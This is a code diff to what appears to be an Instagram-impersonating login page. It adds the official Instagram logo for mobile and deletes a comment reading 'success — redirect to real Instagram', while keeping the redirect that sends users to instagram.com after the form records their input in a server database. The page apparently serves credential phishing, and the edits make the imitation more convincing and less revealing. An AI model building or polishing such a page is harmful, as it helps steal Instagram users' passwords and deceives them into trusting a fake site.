@@ -392,6 +392,20 @@ footer {
   font-size: 11px;
   max-width: 360px;
 }
+
+.mobile-logo {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    margin-top: 24px;
+    margin-bottom: 28px;
+  }
+
+  .mobile-logo img {
+    width: 75px;
+    height: 75px;
+    object-fit: contain;
+  }
 }
 
     }
@@ -425,6 +439,12 @@ footer {
 
     <!-- RIGHT SIDE (AUTH + DB) -------------------------------------->
     <section class="right">
+      <div class="mobile-logo">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png"
+          alt="Instagram"
+        />
+      </div>
       <div class="login-panel">
         <!-- Сообщения от сервера -->
         <div id="msg"></div>
@@ -518,7 +538,7 @@ footer {
           return;
         }
 
-        // success — redirect to real Instagram
+        
         window.location.href = "https://instagram.com";
       } catch (err) {
         msg.textContent = "Network error";
